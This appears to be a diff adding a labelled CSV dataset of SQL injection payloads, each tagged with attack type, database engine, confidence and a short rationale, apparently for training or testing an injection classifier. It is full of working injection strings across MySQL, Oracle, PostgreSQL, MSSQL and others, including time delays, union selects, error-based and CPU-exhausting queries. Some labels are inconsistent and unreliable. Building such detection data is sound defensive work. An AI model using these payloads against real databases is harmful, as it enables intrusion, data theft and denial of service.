@@ -1,0 +1,201 @@
+id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
+20944,1' ) and sleep ( 5 ) #,time_blind,mysql,0.9,"sleep() function detected for MySQL time-based blind SQLi. Pattern 'sleep ( 5 )' is definitive time-based attack vector.",2
+20945,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'cbaj' = 'cbaj,time_blind,mysql,0.75,"sleep() in subquery indicates time-based blind SQLi against MySQL. Nested SELECT with sleep(5) delay vector.",1
+20946,"-8040"" ) ) ) or make_set ( 3916 = 6787,6787 ) and ( ( ( ""laar"" like ""laar",boolean_blind,mysql,0.7,"make_set() function with boolean condition 'or make_set' for MySQL boolean-based blind SQLi.",0
+20947,"-9932"" union all select 4049,4049,4049--",union_based,generic,0.8,"'union all select' pattern is classic union-based SQLi. Column count and structure match union injection.",2
+20948,"1' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.75,"elt() function with equality check AND sleep() present. Priority elt(P3) > sleep(P5), classified as boolean_blind.",2
+20949,"1' and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.95,"dbms_pipe.receive_message() is Oracle-exclusive time-based blind function. Message receipt with delay = time_blind attack.",3
+20950,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.8,"'union all select' with NULL padding for union-based SQLi. Multiple columns padding indicates result set alignment.",2
+20951,"1' ) as kbja where 4275 = 4275 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,mysql,0.7,"elt() in IF() condition for boolean exfiltration. Large numbers (8446744073709551610) suggest DoS/heavy_query but elt() priority is lower.",1
+20952,1'+ ( select 'hjku' where 1954 = 1954 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',time_blind,mysql,0.75,"sleep() nested in subquery with boolean context. String concatenation ('+') typical MySQL time-based blind structure.",1
+20953,"1 ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 1624 = 1624",error_based,mysql,0.8,"extractvalue() for MySQL error-based SQLi. XPath injection in extractvalue() triggers database error.",1
+20954,"1"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""smhd"" like ""smhd",error_based,mysql,0.9,"extractvalue() function with XPath syntax. MySQL-specific error-based SQLi vector confirmed.",2
+20955,"-1174"" union all select 4303,4303,4303,4303#",union_based,generic,0.8,"'union all select' with repeated column values for union-based SQLi injection.",2
+20956,"1 ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.7,"sysibm.systables indicates DB2 database. Cartesian join (t1,t2,t3) = heavy_query pattern but boolean condition is primary.",0
+20957,"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxhn' like 'zxhn",boolean_blind,mysql,0.7,"elt() with floor(rand()) = boolean exfiltration via GROUP BY. MySQL blind SQLi pattern.",1
+20958,"1, ( select ( case when ( 1255 = 8025 ) then 1 else 1255* ( select 1255 from mysql.db ) end ) )",boolean_blind,mysql,0.7,"'case when' with mysql.db reference. MySQL-specific boolean condition for conditional SQLi.",1
+20959,-1217' ) ) ) order by 1#,boolean_blind,generic,0.5,"order by 1 clause suggests column count enumeration. Minimal injection context but order by is common reconnaissance.",0
+20960,"iif ( 2205 = 4764,1,1/0 )",benign,generic,0.5,"iif() function appears but lacks injection context. Standalone conditional without clear SQL context.",0
+20961,"1"" union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.8,"'union all select' with NULL columns = union-based SQLi for result set alignment.",2
+20962,"select * from generate_series ( 3267,3267,case when ( 3267 = 5900 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.75,"generate_series() with 'case when' = PostgreSQL boolean-based blind SQLi. Dynamic range using conditional.",1
+20963,"-5148"" ) ) or 5310 = 8229",boolean_blind,generic,0.5,"or 5310 = 8229 = boolean inequality without clear injection signal. Minimal evidence of attack.",1
+20964,1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 9505 = 9505,time_blind,postgresql,0.9,"pg_sleep() is PostgreSQL time-based blind SQLi marker. select from pg_sleep() = definitive time delay injection.",2
+20965,1 ) ) ) and 9198 = 9198--,boolean_blind,generic,0.5,"and 9198 = 9198 = generic boolean always-true condition. Low confidence without DB/function markers.",1
+20966,1%' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,"pg_sleep() function = PostgreSQL time-based blind. select from pg_sleep() = attack marker.",2
+20967,1'+ ( select 'zugq' where 9218 = 9218,boolean_blind,generic,0.5,"Generic boolean condition without SQLi function markers. Minimal attack evidence.",0
+20968,"1%' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and '%' = '",boolean_blind,mssql,0.75,"convert(int,...) and char() concatenation = MSSQL boolean-based blind with type casting attack.",1
+20969,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",union_based,generic,0.8,"'union all select' with 10 repeated columns = union-based SQLi injection.",2
+20970,"-1889%' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = '",out_of_band,oracle,0.8,"ctxsys.drithsx.sn() = Oracle out-of-band error-based SQLi. Context XPath function triggers external data exfiltration.",1
+20971,"1' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.65,"repeat(left(...,500000000)) = CPU-intensive heavy query with regexp_substring. DoS-style payload.",0
+20972,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'yhkr' = 'yhkr",boolean_blind,firebird,0.7,"rdb$ metadata tables (Firebird-specific) with cartesian join = boolean-based blind SQLi.",1
+20973,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",union_based,generic,0.8,"'union all select' with 10 padding columns = union-based SQLi.",2
+20974,"1"" where 7158 = 7158",benign,generic,0.5,"where 7158 = 7158 = generic always-true condition without injection context.",1
+20975,"1"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.65,"char() concatenation with repeat(left(...,500000000)) = CPU-intensive DoS query. Heavy query pattern.",0
+20976,1 where 3735 = 3735,benign,generic,0.5,"where 3735 = 3735 = static boolean condition without SQLi markers.",0
+20977,"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) # lgoz",boolean_blind,mysql,0.7,"elt() in IF() for boolean exfiltration via GROUP BY aggregate. MySQL blind SQLi.",2
+20978,"1%"" ) ) and 9198 = 9198--",boolean_blind,generic,0.5,"and 9198 = 9198 = generic equality without specific attack markers.",0
+20979,"1, ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7823 = 7823 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",boolean_blind,postgresql,0.7,"cast(...as numeric) with ::text = PostgreSQL type casting for boolean condition manipulation.",1
+20980,"1'|| ( select 'uvbb' where 7795 = 7795 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",heavy_query,generic,0.65,"repeat(left(...,500000000)) = CPU-heavy payload. Heavy query attack pattern.",0
+20981,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'ksoc' = 'ksoc,time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",2
+20982,select ( case when ( 1005 = 5996 ) then 1 else 1005* ( select 1005 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.7,"master..sysdatabases = MSSQL metadata reference. case when with subquery select = MSSQL boolean-blind.",2
+20983,"-9272%"" ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""%"" = """,out_of_band,oracle,0.85,"utl_inaddr.get_host_address() = Oracle out-of-band/error-based. Network function for data exfiltration.",2
+20984,1'+ ( select rdwb where 2498 = 2498 and 3429 = 7639--,boolean_blind,generic,0.5,"and 3429 = 7639 = generic inequality. Minimal attack context.",1
+20985,-9191' ) as qtvm where 2838 = 2838 or ( 8459 = 8459 ) *4906--,boolean_blind,generic,0.5,"or ( 8459 = 8459 ) = boolean equality without clear SQLi markers.",0
+20986,select ( case when ( 4935 = 4734 ) then 4935 else 4935* ( select 4935 from mysql.db ) end ) #,boolean_blind,mysql,0.7,"mysql.db reference with case when = MySQL-specific boolean-blind SQLi.",2
+20987,"-9840 ) ) as thod where 4790 = 4790 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,mssql,0.75,"convert(int,...) with char() = MSSQL boolean-blind type casting attack.",1
+20988,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '",heavy_query,generic,0.65,"repeat(...,500000000) = CPU-intensive heavy query (DoS pattern).",0
+20989,"1 ) ) as hgtl where 3864 = 3864 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.7,"elt() priority(P3) > sleep(P5). elt() with boolean condition = MySQL boolean-blind SQLi.",2
+20990,"1%"" ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,out_of_band,oracle,0.8,"ctxsys.drithsx.sn() = Oracle OOB/error-based function.",1
+20991,"1"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""fbol"" like ""fbol",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive heavy query (DoS).",0
+20992,"1 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) # eahg",error_based,mysql,0.65,"exp(~...) = MySQL bitwise NOT exp() error function for error-based SQLi.",1
+20993,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",union_based,generic,0.8,"'union all select' = union-based SQLi injection.",2
+20994,"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'zpkv' = 'zpkv",error_based,mysql,0.85,"updatexml() = MySQL XPath injection error-based SQLi. Nested elt() in concat().",2
+20995,"1 ) where 6954 = 6954 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive heavy query payload.",0
+20996,"1'|| ( select 'osty' from dual where 6433 = 6433 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",heavy_query,oracle,0.7,"all_users cartesian join (t1-t5) = Oracle heavy query with boolean context.",1
+20997,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'hqcz' = 'hqcz,boolean_blind,mysql,0.7,"rlike(select sleep()) = MySQL boolean-blind using RLIKE regex function.",2
+20998,"1"" ) as ivkw where 4218 = 4218 union all select null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+20999,1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'gjja' = 'gjja,time_blind,postgresql,0.9,"pg_sleep() = PostgreSQL time-based blind SQLi.",2
+21000,"1"" ) where 2088 = 2088 union all select null,null,null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21001,"-2230%"" union all select 3303,3303,3303--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21002,"1"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,"all_users cartesian join (t1-t5) = Oracle heavy query attack.",1
+21003,"-4418"" or 6872 = 6872 and ""gbut"" = ""gbut",boolean_blind,generic,0.5,"or 6872 = 6872 = generic boolean without SQLi markers.",1
+21004,select sleep ( 5 ) and ( ( 'wyvx' = 'wyvx,time_blind,mysql,0.9,"sleep() function = MySQL time-based blind SQLi.",3
+21005,"1"" ) ) as xhat where 6674 = 6674 union all select null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21006,1'|| ( select 'brde' where 7390 = 7390 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',out_of_band,oracle,0.85,"utl_inaddr.get_host_address() = Oracle out-of-band SQLi.",2
+21007,"1%"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""%"" = """,heavy_query,oracle,0.7,"all_users cartesian join (t1-t5) = Oracle heavy query.",1
+21008,1' where 9242 = 9242,benign,generic,0.5,"where 9242 = 9242 = static condition without SQLi context.",0
+21009,"-6041' ) ) or make_set ( 9835 = 1367,1367 ) and ( ( 'hxjf' = 'hxjf",boolean_blind,mysql,0.7,"make_set() = MySQL boolean-blind function.",2
+21010,"1"" ) as jask where 7629 = 7629 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.9,"dbms_pipe.receive_message() = Oracle time-based blind SQLi.",2
+21011,"-5235 ) or make_set ( 9354 = 9354,7185 )",boolean_blind,mysql,0.7,"make_set() = MySQL boolean-blind function.",0
+21012,"-9820"" or 1038 = 7502#",boolean_blind,generic,0.5,"or 1038 = 7502 = generic inequality without SQLi markers.",1
+21013,"1 ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 9462 = 9462",heavy_query,oracle,0.7,"all_users cartesian join (t1-t5) = Oracle heavy query.",0
+21014,"1'+ ( select 'usoq' where 7783 = 7783 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) +'",error_based,mysql,0.85,"updatexml() = MySQL error-based SQLi with XPath injection.",1
+21015,"1"" ) and 7533 = 7533 and ( ""jfsw"" like ""jfsw",boolean_blind,generic,0.5,"and 7533 = 7533 = generic boolean without SQLi markers.",1
+21016,"1%' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",heavy_query,postgresql,0.75,"generate_series(1,5000000) = PostgreSQL heavy query (DoS pattern).",2
+21017,-5852 ) as anca where 3574 = 3574 or 3958 = 5536#,boolean_blind,generic,0.5,"or 3958 = 5536 = generic inequality.",0
+21018,"( select 1 from generate_series ( 8515,8515,case when ( 8515 = 3477 ) then 1 else 0 end ) limit 1 )",boolean_blind,postgresql,0.7,"generate_series(...case when...) = PostgreSQL boolean-blind.",1
+21019,"1%"" ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,mssql,0.7,"sysusers cartesian join (sys1-sys7) = MSSQL heavy query with boolean context.",1
+21020,"-2840' ) ) ) union all select 3025,3025,3025,3025--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21021,select case when 5346 = 8272 then 1 else null end--,benign,generic,0.5,"case when...then...else...end = conditional without clear SQLi context.",0
+21022,"select sleep ( 5 ) and ""oivc"" like ""oivc",time_blind,mysql,0.9,"sleep() = MySQL time-based blind SQLi.",2
+21023,"1"" ) ) as xhat where 6674 = 6674 union all select null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21024,1 ) as eryo where 2531 = 2531 rlike sleep ( 5 ) --,time_blind,mysql,0.75,"sleep() with rlike = MySQL time-based blind (rlike secondary).",2
+21025,"-2912"" ) as eizh where 2223 = 2223 or make_set ( 1041 = 3056,3056 ) --",boolean_blind,mysql,0.7,"make_set() = MySQL boolean-blind function.",0
+21026,"1'|| ( select 'skds' from dual where 8594 = 8594 and make_set ( 6779 = 2027,2027 ) ) ||'",boolean_blind,mysql,0.7,"make_set() function but dual indicates Oracle. Conservative: generic boolean-blind.",0
+21027,"1%' union all select null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21028,"1"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.7,"repeat(...,5000000000) = CPU-intensive heavy query (DoS).",0
+21029,1' ) as imgv where 7802 = 7802,benign,generic,0.5,"where 7802 = 7802 = static condition without SQLi markers.",0
+21030,1'+ ( select 'vidl' where 9445 = 9445 and 5498 = 5777#,boolean_blind,generic,0.5,"and 5498 = 5777 = generic inequality.",0
+21031,"1 ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4277 = 4277",heavy_query,postgresql,0.8,"generate_series(1,5000000) = PostgreSQL heavy query.",2
+21032,"1%' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and '%' = '",boolean_blind,mysql,0.7,"elt() with GROUP BY = MySQL boolean-blind SQLi.",1
+21033,"1%' union all select null,null,null,null,null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21034,"-4072%"" ) ) ) or 3999 = 1979",boolean_blind,generic,0.5,"or 3999 = 1979 = generic inequality.",0
+21035,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21036,"1"" and sleep ( 5 ) #",time_blind,mysql,0.9,"sleep() = MySQL time-based blind SQLi.",2
+21037,"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""kpwc"" like ""kpwc",heavy_query,oracle,0.7,"all_users cartesian join = Oracle heavy query with boolean context.",0
+21038,"-4728"" ) ) as ndri where 3278 = 3278 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,mysql,0.7,"make_set() = MySQL boolean-blind function.",0
+21039,"1"" ) as obbk where 6414 = 6414 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.7,"elt() with GROUP BY aggregate = MySQL boolean-blind SQLi.",1
+21040,"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""ppml"" = ""ppml",time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
+21041,"1"" ) as zbhs where 2017 = 2017 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",boolean_blind,mysql,0.7,"elt() in GROUP BY = MySQL boolean-blind SQLi.",1
+21042,"-1106' ) ) union all select 2855,2855,2855,2855,2855,2855,2855#",union_based,generic,0.85,"'union all select' = union-based SQLi. Rule + heuristic agree.",3
+21043,"waitfor delay '0:0:5' and ( ( ""zili"" like ""zili",time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
+21044,"1%' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( '%' = '",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive DoS query.",1
+21045,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""ljkg"" = ""ljkg",time_blind,oracle,0.9,"dbms_pipe.receive_message() = Oracle time-based blind SQLi.",2
+21046,"1%"" union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21047,1' in boolean mode ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
+21048,"1%"" ) ) ) union all select null,null,null,null,null#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21049,"-8888%' ) union all select 5312,5312,5312,5312,5312,5312,5312,5312--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21050,"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""dnlz"" = ""dnlz",time_blind,oracle,0.9,"dbms_pipe.receive_message() = Oracle time-based blind SQLi.",2
+21051,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'stea' = 'stea,time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
+21052,"-1490'|| ( select 'uzbm' from dual where 3181 = 3181 union all select 3181,3181,3181,3181,3181--",union_based,oracle,0.85,"'union all select' with dual = Oracle union-based SQLi.",2
+21053,"1"" ) where 5794 = 5794 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21054,"-5891 ) where 5792 = 5792 union all select 5792,5792,5792,5792,5792#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21055,"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( ""%"" = """,time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
+21056,1'|| ( select 'xglm' from dual where 3556 = 3556 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,oracle,0.85,"pg_sleep() detected but dual suggests Oracle. Conservative: time_blind with oracle DB.",0
+21057,"1"" ) ) and sleep ( 5 ) and ( ( ""timv"" = ""timv",time_blind,mysql,0.85,"sleep() = MySQL time-based blind SQLi.",2
+21058,"-7544"" ) ) union all select 3808,3808,3808,3808--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21059,"-7032' ) as xmmm where 5635 = 5635 union all select 5635,5635,5635,5635,5635--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21060,waitfor delay '0:0:5' and ( ( ( 'hrta' = 'hrta,time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
+21061,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'lgat' like 'lgat",error_based,mysql,0.8,"extractvalue() = MySQL error-based SQLi with XPath injection.",1
+21062,"1"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,"pg_sleep() = PostgreSQL time-based blind SQLi.",2
+21063,"-9389' where 5713 = 5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21064,"1"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""ponv"" = ""ponv",boolean_blind,mysql,0.7,"elt() with GROUP BY = MySQL boolean-blind SQLi.",1
+21065,"1 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21066,"1"" ) union all select null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21067,"1' ) union all select null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21068,-2733' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'btjx' = 'btjx,error_based,oracle,0.85,"xmltype() = Oracle error-based SQLi with XML cast error.",1
+21069,"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,oracle,0.9,"dbms_pipe.receive_message() = Oracle time-based blind SQLi.",2
+21070,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
+21071,"1 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21072,"1'+ ( select lang where 4191 = 4191 union all select null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21073,1%' ) ) union all select null--,union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21074,"1' ) ) as nuku where 7009 = 7009 union all select null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21075,"1 ) ) union all select null,null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21076,"1 ) where 2020 = 2020 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive heavy query (DoS).",0
+21077,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,0.9,"dbms_pipe.receive_message() = Oracle time-based blind SQLi.",2
+21078,"1 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive heavy query (DoS).",0
+21079,"1%' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.7,"elt() (P3) takes priority over sleep(P5). MySQL boolean-blind SQLi.",1
+21080,"-1015"" ) ) union all select 6624,6624#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21081,"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""iuxs"" like ""iuxs",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive heavy query (DoS).",0
+21082,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'jfwt' like 'jfwt",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive heavy query (DoS).",0
+21083,"-1487"" ) as crfi where 2407 = 2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
